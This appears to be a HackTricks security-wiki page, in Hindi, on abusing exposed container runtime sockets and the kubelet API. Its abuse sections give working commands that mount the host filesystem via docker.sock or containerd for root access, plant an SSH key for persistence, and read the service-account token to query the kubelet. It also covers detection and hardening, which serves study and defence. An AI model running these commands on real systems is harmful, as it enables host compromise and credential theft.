# Runtime API और Daemon का Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Container से जुड़े कई वास्तविक compromises namespace escape से शुरू ही नहीं होते। उनकी शुरुआत runtime control plane तक पहुँच से होती है। यदि कोई workload mounted Unix socket या exposed TCP listener के ज़रिए `dockerd`, `containerd`, CRI-O, Podman या kubelet से बात कर सकता है, तो attacker बेहतर privileges वाला नया container बनाने, host filesystem mount करने, host namespaces से जुड़ने या संवेदनशील node information पाने का अनुरोध कर सकता है। ऐसे मामलों में runtime API ही वास्तविक security boundary है, और इसे compromise करना व्यावहारिक रूप से host को compromise करने जैसा है।

इसीलिए runtime socket exposure को kernel protections से अलग दर्ज किया जाना चाहिए। साधारण seccomp, capabilities और MAC confinement वाला container भी host compromise से बस एक API call दूर हो सकता है, यदि उसके अंदर `/var/run/docker.sock` या `/run/containerd/containerd.sock` mounted हो। मौजूदा container का kernel isolation बिल्कुल अपेक्षा के अनुसार काम कर रहा हो सकता है, जबकि runtime management plane पूरी तरह exposed हो।

## Daemon Access Models

Docker Engine पारंपरिक रूप से अपना privileged API local Unix socket `unix:///var/run/docker.sock` के ज़रिए expose करता है। ऐतिहासिक रूप से इसे `tcp://0.0.0.0:2375` जैसे TCP listeners या `2376` पर TLS-protected listener के ज़रिए remotely भी expose किया गया है। मजबूत TLS और client authentication के बिना daemon को remotely expose करना, प्रभावी रूप से Docker API को remote root interface बना देता है।

containerd, CRI-O, Podman और kubelet भी इसी तरह के high-impact surfaces expose करते हैं। नाम और workflows अलग हैं, लेकिन मूल तर्क नहीं। यदि interface caller को workloads बनाने, host paths mount करने, credentials पाने या running containers बदलने देता है, तो वह एक privileged management channel है और उसके साथ उसी के अनुसार व्यवहार किया जाना चाहिए।

Container-management web UI भी यही boundary expose कर सकता है, भले ही local account को socket तक सीधी पहुँच न दी गई हो। उदाहरण के लिए, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) में legacy 1.11.1 build में unauthenticated administrator-password reset दर्ज किया गया था। Locally reachable UI को केवल जाँच के सुराग के रूप में लें: installed build और authentication behavior, वास्तविक administrator control, और यह पुष्टि करें कि उसका managed endpoint writable host bind mount के साथ containers बना सकता है या नहीं। [Portainer के दस्तावेज़](https://docs.portainer.io/admin/environments/add/docker/socket) बताते हैं कि socket-backed management के लिए Docker socket तक पहुँच आवश्यक है; rootless या restricted endpoint से host पर पड़ने वाला प्रभाव बदल जाता है। केवल process name, port या version string के आधार पर authentication flaw या host-root access का निष्कर्ष न निकालें।

जाँचने लायक सामान्य local paths हैं:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

पुराने या अधिक विशिष्ट stacks में `dockershim.sock`, `frakti.sock`, या `rktlet.sock` जैसे endpoints भी खुले हो सकते हैं। आधुनिक environments में ये कम आम हैं, लेकिन मिलने पर इनके साथ भी उतनी ही सावधानी बरतनी चाहिए, क्योंकि ये सामान्य application sockets के बजाय runtime-control surfaces हैं।

## सुरक्षित रिमोट एक्सेस

अगर किसी daemon को local socket के बाहर उपलब्ध कराना ज़रूरी हो, तो connection को TLS से सुरक्षित रखना चाहिए और बेहतर होगा कि mutual authentication का उपयोग किया जाए, ताकि daemon client को verify करे और client daemon को। सुविधा के लिए Docker daemon को plain HTTP पर खोलने की पुरानी आदत, container administration की सबसे खतरनाक गलतियों में से एक है, क्योंकि API surface इतना शक्तिशाली है कि इससे सीधे privileged containers बनाए जा सकते हैं।

Docker की ऐतिहासिक configuration pattern कुछ ऐसी दिखती थी:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

systemd-आधारित hosts पर, daemon communication `fd://` के रूप में भी दिखाई दे सकता है। इसका मतलब है कि process, systemd से पहले से खुला हुआ socket inherit करता है, न कि उसे खुद सीधे bind करता है। अहम बात exact syntax नहीं, बल्कि इसका security consequence है। जैसे ही daemon किसी सख्त permissions वाले local socket से आगे listen करता है, transport security और client authentication वैकल्पिक hardening नहीं, बल्कि अनिवार्य हो जाते हैं।

## दुरुपयोग

अगर runtime socket मौजूद है, तो पुष्टि करें कि वह कौन-सा है, क्या कोई compatible client मौजूद है, और क्या raw HTTP या gRPC access संभव है:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

ये commands उपयोगी हैं, क्योंकि इनसे dead path, mounted लेकिन inaccessible socket, और live privileged API के बीच अंतर पता चलता है। अगर client सफल होता है, तो अगला सवाल यह है कि क्या API host bind mount या host namespace sharing के साथ नया container launch कर सकती है।

### जब कोई Client Installed न हो

`docker`, `podman`, या किसी अन्य सुविधाजनक CLI का मौजूद न होना यह नहीं दर्शाता कि socket सुरक्षित है। Docker Engine अपने Unix socket पर HTTP के ज़रिए संचार करता है, और Podman, `podman system service` के माध्यम से Docker-compatible API और Libpod-native API—दोनों उपलब्ध कराता है। इसका मतलब है कि केवल `curl` वाले minimal environment से भी daemon को नियंत्रित करना संभव हो सकता है:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

यह post-exploitation के दौरान मायने रखता है, क्योंकि defenders कभी-कभी सामान्य client binaries हटा देते हैं, लेकिन management socket mounted छोड़ देते हैं। Podman hosts पर ध्यान रखें कि rootful और rootless deployments में high-value path अलग होता है: rootful service instances के लिए `unix:///run/podman/podman.sock` और rootless instances के लिए `unix://$XDG_RUNTIME_DIR/podman/podman.sock`।

### पूरा उदाहरण: Docker Socket से Host Root तक

अगर `docker.sock` तक पहुंचा जा सकता है, तो सामान्य escape तरीका ऐसा नया container शुरू करना है जो host root filesystem को mount करे और फिर उसमें `chroot` करे:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

यह Docker daemon के माध्यम से सीधे host-root execution देता है। इसका प्रभाव केवल files पढ़ने तक सीमित नहीं है। नए container के अंदर पहुँचने के बाद, attacker host files में बदलाव कर सकता है, credentials हासिल कर सकता है, persistence स्थापित कर सकता है या अतिरिक्त privileged workloads शुरू कर सकता है।

### पूरा उदाहरण: Docker Socket से Host Namespaces तक

अगर attacker केवल filesystem access के बजाय namespace entry को प्राथमिकता देता है:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

यह तरीका runtime से explicit host-namespace exposure के साथ नया container बनाने को कहकर host तक पहुँचता है, न कि मौजूदा container का exploit करके।

### Docker Socket Persistence Pattern

Runtime control का इस्तेमाल one-shot shell के बजाय persistence के लिए भी किया जा सकता है। सामान्य pattern यह है कि host mount के साथ एक helper container बनाया जाए, mounted host filesystem में authorized access material या startup hook लिखा जाए, और फिर validate किया जाए कि host उसे consume करता है।

उदाहरण का स्वरूप:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

वही विचार operator जिस चीज़ को साबित करना चाहता है, उसके आधार पर systemd units, cron fragments, application startup files या SSH keys को target कर सकता है। अहम बात यह है कि persistent change runtime daemon की host-level filesystem authority के ज़रिए किया जाता है, न कि मूल container में अतिरिक्त privilege के ज़रिए।

### Raw Docker API Helper Pivot

जब Docker CLI उपलब्ध न हो, तो वही host-mount helper flow Unix socket पर HTTP के ज़रिए चलाया जा सकता है। सामान्य flow यह है: API की पुष्टि करें, host bind mount के साथ helper container बनाएँ, उसे start करें, एक exec instance बनाएँ, और उस exec को start करें।

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

अंतिम `/exec/<id>/start` अनुरोध, लौटाए गए exec ID पर निर्भर करता है, लेकिन सुरक्षा का मुद्दा JSON plumbing के सटीक विवरण से स्वतंत्र है: rootful Docker daemon तक raw API access ही अधिक शक्तिशाली helper workload का अनुरोध करने के लिए पर्याप्त है।

### पूरा उदाहरण: containerd Socket

माउंट किया गया `containerd` socket आम तौर पर उतना ही खतरनाक होता है:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

यदि अधिक Docker-जैसा client मौजूद हो, तो `nerdctl`, `ctr` की तुलना में अधिक सुविधाजनक हो सकता है, क्योंकि यह `--privileged`, `--pid=host` और `-v` जैसे परिचित flags उपलब्ध कराता है:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

इसका प्रभाव फिर से host compromise है। Docker-विशिष्ट tooling मौजूद न होने पर भी, कोई दूसरा runtime API वही administrative power दे सकता है। Kubernetes nodes पर, `crictl` reconnaissance और container interaction के लिए पर्याप्त हो सकता है, क्योंकि यह सीधे CRI endpoint से बात करता है।

### BuildKit Socket

`buildkitd` को आसानी से नज़रअंदाज़ किया जा सकता है, क्योंकि लोग अक्सर इसे "सिर्फ build backend" मानते हैं। लेकिन daemon अब भी एक privileged control plane है। सुलभ `buildkitd.sock` किसी attacker को arbitrary build steps चलाने, worker capabilities का निरीक्षण करने, compromised environment के local contexts का इस्तेमाल करने और `network.host` या `security.insecure` जैसे खतरनाक entitlements का अनुरोध करने दे सकता है—यदि daemon को इसकी अनुमति देने के लिए configure किया गया हो।

शुरुआत में काम आने वाले interactions ये हैं:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

यदि daemon build requests स्वीकार करता है, तो जाँचें कि क्या insecure entitlements उपलब्ध हैं:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

सटीक प्रभाव daemon configuration पर निर्भर करता है, लेकिन permissive entitlements वाली rootful BuildKit service डेवलपर की कोई हानिरहित सुविधा नहीं है। इसे एक अन्य high-value administrative surface मानें, खासकर CI runners और shared build nodes पर।

### TCP पर Kubelet API

kubelet कोई container runtime नहीं है, लेकिन यह node management plane का हिस्सा है और अक्सर उसी trust boundary चर्चा में आता है। अगर workload से kubelet का secure port `10250` पहुंच योग्य है, या node credentials, kubeconfigs, अथवा proxy rights उजागर हैं, तो attacker Pods की सूची बना सकता है, logs प्राप्त कर सकता है, या node-local containers में commands चला सकता है—और इसके लिए उसे Kubernetes API server के admission path से गुज़रने की भी ज़रूरत नहीं होगी।

शुरुआत आसान discovery से करें:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

यदि kubelet या API-server proxy path `exec` को authorize करता है, तो WebSocket-capable client इसका उपयोग node पर मौजूद अन्य containers में code execution करने के लिए कर सकता है। यही कारण है कि केवल `get` permission वाला `nodes/proxy` भी सुनने में जितना लगता है, उससे अधिक खतरनाक है: request अब भी ऐसे kubelet endpoints तक पहुँच सकती है जो commands execute करते हैं, और kubelet के साथ ये direct interactions सामान्य Kubernetes audit logs में दिखाई नहीं देते।<sup>[[2]](#references)</sup>

## जाँच

इन जाँचों का उद्देश्य यह पता लगाना है कि क्या container किसी ऐसे management plane तक पहुँच सकता है, जिसे trust boundary के बाहर रहना चाहिए था।

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

यहाँ क्या महत्वपूर्ण है:

- माउंट किया गया runtime socket आमतौर पर केवल जानकारी का खुलासा नहीं, बल्कि सीधे प्रशासनिक नियंत्रण का साधन होता है।
- TLS के बिना `2375` पर सुनने वाले TCP listener को remote compromise की स्थिति मानना चाहिए।
- `DOCKER_HOST` जैसे environment variables अक्सर बताते हैं कि workload को जानबूझकर host runtime से बात करने के लिए डिज़ाइन किया गया था।

## Runtime के डिफ़ॉल्ट

| Runtime / platform | डिफ़ॉल्ट स्थिति | डिफ़ॉल्ट व्यवहार | आम तौर पर मैन्युअल रूप से सुरक्षा कम करने के तरीके |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से स्थानीय Unix socket | `dockerd` स्थानीय socket पर सुनता है और daemon आमतौर पर rootful होता है | `/var/run/docker.sock` को mount करना, `tcp://...:2375` को expose करना, `2376` पर कमज़ोर या अनुपस्थित TLS |
| Podman | डिफ़ॉल्ट रूप से Daemonless CLI | सामान्य स्थानीय उपयोग के लिए लंबे समय तक चलने वाले privileged daemon की ज़रूरत नहीं होती; `podman system service` सक्षम होने पर API sockets फिर भी expose हो सकते हैं | `podman.sock` को expose करना, service को व्यापक रूप से चलाना, rootful API का उपयोग |
| containerd | स्थानीय privileged socket | प्रशासनिक API स्थानीय socket के माध्यम से expose होती है और आमतौर पर उच्च-स्तरीय tooling इसका उपयोग करती है | `containerd.sock` को mount करना, `ctr` या `nerdctl` तक व्यापक पहुँच देना, privileged namespaces को expose करना |
| CRI-O | स्थानीय privileged socket | CRI endpoint को node-local विश्वसनीय components के लिए बनाया गया है | `crio.sock` को mount करना, CRI endpoint को untrusted workloads के लिए expose करना |
| Kubernetes kubelet | Node-local management API | Kubelet को Pods से व्यापक रूप से पहुँच योग्य नहीं होना चाहिए; authn/authz के आधार पर पहुँच से pod state, credentials और execution features उजागर हो सकते हैं | kubelet sockets या certs को mount करना, kubelet auth को कमज़ोर करना, host networking के साथ kubelet endpoint तक पहुँच योग्य बनाना |

## References

- [1] [containerd socket का exploitation, भाग 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server को bypass करने के जोखिम](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
